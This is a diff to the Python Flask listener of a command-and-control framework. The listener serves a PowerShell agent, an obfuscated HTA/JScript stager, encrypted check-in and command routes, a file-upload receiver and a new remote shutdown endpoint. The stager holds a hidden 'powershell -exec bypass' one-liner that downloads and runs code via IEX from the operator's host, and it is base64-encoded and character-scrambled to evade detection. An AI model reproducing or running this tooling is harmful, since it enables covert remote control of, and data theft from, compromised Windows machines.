@@ -10,6 +10,7 @@ import signal
 import string
 import random
 from termcolor import colored
+import requests as web_requests
 from .functions import *
 from .encryption import *
 from .esa import *
@@ -37,6 +38,7 @@ class NewListener:
         self.host = args[3]
         self.interval = args[4]
         self.path = args[5]
+
     elif len(args) == 8:
 
         self.name = args[0]
@@ -70,32 +72,24 @@ class NewListener:
         thread.daemon = True
         thread.start()
     listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]
+
   def powershell_code(self):
-        f = open("agents/agent.ps1.oct")
-        if self.ssl:
-            proto = "https"
-        else:
-            proto = "http"
+      f = open("agents/agent.ps1.oct")
+      if self.ssl:
+          proto = "https"
+      else:
+          proto = "http"
 
-        srvhost = self.host + ":" + str(self.bindport)
-        command_host_url = command_send_url.split("/")[1]
-        pcode = f.read()
-        pcode1 = pcode.replace("OCU_INTERVAL", str(self.interval))
-        pcode2 = pcode1.replace("OCT_KEY", str(aes_encryption_key))
-        pcode3 = pcode2.replace("OCT_first_ping", first_ping_url.split("/")[1])
-        pcode4 = pcode3.replace("OCT_command", command_host_url)
-        pcode5 = pcode4.replace("OCT_report", report_url.split("/")[1])
-        pcode6 = pcode5.replace("OCT_file_receiver", file_receiver_url.split("/")[1])
-        pcode7 = pcode6.replace("OCTRECV", command_receiver_url.split("/")[1])
-        pcode8 = pcode7.replace("OCU_PROTO", proto)
-        pcode9 = pcode8.replace("SRVHOST", srvhost)
-        response = make_response(pcode9)
-        response.headers["Server"] = server_response_header
-        return response
-
+      srvhost = self.host + ":" + str(self.bindport)
+      template = f.read()
+      pcode = replace_agent_config_vars(template, proto, srvhost, self.interval)
+      response = make_response(pcode)
+      response.headers["Server"] = server_response_header
+      return response
 
   def create_path(self):
-      app.add_url_rule("/%s" % self.path, self.host, self.powershell_code)
+      a = "".join([random.choice(string.ascii_uppercase) for i in range(3)])
+      app.add_url_rule("/%s" % self.path, a, self.powershell_code)
 
   def create_hta(self):
       app.add_url_rule(mshta_url, "hta" , self.hta)
@@ -161,13 +155,20 @@ eval(bas(es));
 </html>
 '''
       js = '''
-var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('http://{ip}:{port}/{payload}'));";
+var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('{protocol}://{ip}:{port}/{payload}'));";
 var w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');
 w32ps.SpawnInstance_();
 w32ps.ShowWindow=0;
 var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\\\',w32ps,null);
 '''
-      js = js.replace('{ip}',self.host).replace('{port}',str(self.bindport)).replace('{payload}',self.path)
+
+
+      if self.ssl:
+          protocol = "https"
+      else:
+          protocol = "http"
+
+      js = js.replace('{ip}',self.host).replace('{port}',str(self.bindport)).replace('{payload}',self.path).replace("{protocol}", protocol)
       #print  js
       js = base64.b64encode(js.encode()).decode() #js.encode('base64').replace('\n', '')
       re = [[']','='],['[','a'],[',','b'],['@','D'],['-','x'],['~','N'],['*','E'],['%','C'],['$','H'],['!','G'],['{','K'],['}','O']]
@@ -190,13 +191,47 @@ def index():
     return resp
 
 
+kill_listener_url = "".join([random.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(15)])
+kill_listener_token = "".join([random.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(50)])
+
+def delete_listener(listener_name):
+    try:
+        listener_info = listeners_information.get(listener_name)
+        host = listener_info[1]
+        port = listener_info[2]
+    except:
+        print(colored("[-] Worng listener name!", "red"))
+        return False
+
+    data = {"shutdown_token": kill_listener_token}
+    request = web_requests.post("http://%s:%s/%s" % (host, port, kill_listener_url), data=data)
+    if request.text == "d":
+        del listeners_information[listener_name]
+        print(colored("[+] Listener %s has been deleted" % (listener_name), "green"))
+
+def shutdown_server():
+    func = request.environ.get('werkzeug.server.shutdown')
+    if func is None:
+        pass
+    func()
+
+@app.route('/%s' % kill_listener_url, methods=['POST'])
+def shutdown():
+    token = request.form["shutdown_token"]
+    if token == kill_listener_token:
+        shutdown_server()
+        return "d"
+    else:
+        return "No!"
+
+
 @app.route(file_receiver_url, methods=["POST"])
 def fr():
-    filename = decrypt_command(aes_encryption_key, request.form["fn"].replace(" ","+"))
+    filename = decrypt_command(aes_key, aes_iv, request.form["fn"].replace(" ","+"))
     f = open(filename.strip("\x00"), "wb")
     #fdata = request.form["token"].replace(" ", "+").encode().
     fdata = request.form["token"].replace(" ", "+")
-    raw_base64 = decrypt_command(aes_encryption_key, fdata)
+    raw_base64 = decrypt_command(aes_key, aes_iv, fdata)
     #ready_to_write = base64.b64decode(fdata.decode("UTF-16LE"))
     f.write(base64.b64decode(raw_base64.encode()))
     #f.write(base64.b64decode(raw_base64.decode("UTF-16LE")))
@@ -211,12 +246,12 @@ def fr():
 def report():
     try:
         encrypted_host = request.headers["App-Logic"]
-        hostname = decrypt_command(aes_encryption_key, encrypted_host).strip("\x00")
+        hostname = decrypt_command(aes_key, aes_iv, encrypted_host).strip("\x00")
         for key in list(connections_information.keys()):
             if hostname in connections_information[key][2]:
                 session = connections_information[key]
                 header = request.headers["Authorization"]
-                processes = decrypt_command(aes_encryption_key, header).strip("\x00").split(" ")
+                processes = decrypt_command(aes_key, aes_iv, header).strip("\x00").split(" ")
                 esa(processes, session)
             else:
                 pass
@@ -236,7 +271,7 @@ def command(hostname):
             connections_information[required_key][6] = time.ctime()
     try:
             command_to_execute = commands[hostname]
-            commands[hostname] = encrypt_command(aes_encryption_key, "False")
+            commands[hostname] = encrypt_command(aes_key, aes_iv, "False")
     except KeyError:
             return "False"
     response = make_response(command_to_execute)
@@ -248,7 +283,14 @@ def command(hostname):
 def cr():
         try:
             encrypted_response = request.headers["Authorization"]
-            print("\nCommand execution result is : \n" + decrypt_command(aes_encryption_key, encrypted_response).strip("\x00") + "\n")
+            encrypted_hostname = request.headers["App-Logic"]
+            encrypted_command  = request.headers["Session"]
+
+            results = decrypt_command(aes_key, aes_iv, encrypted_response).strip("\x00")
+            hostname = decrypt_command(aes_key, aes_iv, encrypted_hostname).strip("\x00")
+            command = decrypt_command(aes_key, aes_iv, encrypted_command).strip("\x00")
+            log_command(hostname, command, results)
+            print("\nCommand execution result is : \n" + results + "\n")
             return "Done"
         except:
             return ""
@@ -266,7 +308,7 @@ def first_ping():
         try:
             global counter
             header = request.headers["Authorization"]
-            raw_request = str(decrypt_command(aes_encryption_key, header)).strip("\x00").split(",")
+            raw_request = str(decrypt_command(aes_key, aes_iv, header)).strip("\x00").split(",")
             hostname = raw_request[0]
             if hostname in list(commands.keys()):
                     return "HostName exist"
@@ -279,7 +321,7 @@ def first_ping():
             last_ping = time.ctime()
             connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
             print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter))
-            commands[hostname] = encrypt_command(aes_encryption_key, "False")
+            commands[hostname] = encrypt_command(aes_key, aes_iv, "False")
             counter = counter + 1
             response = make_response("")
             response.headers["Server"] = server_response_header
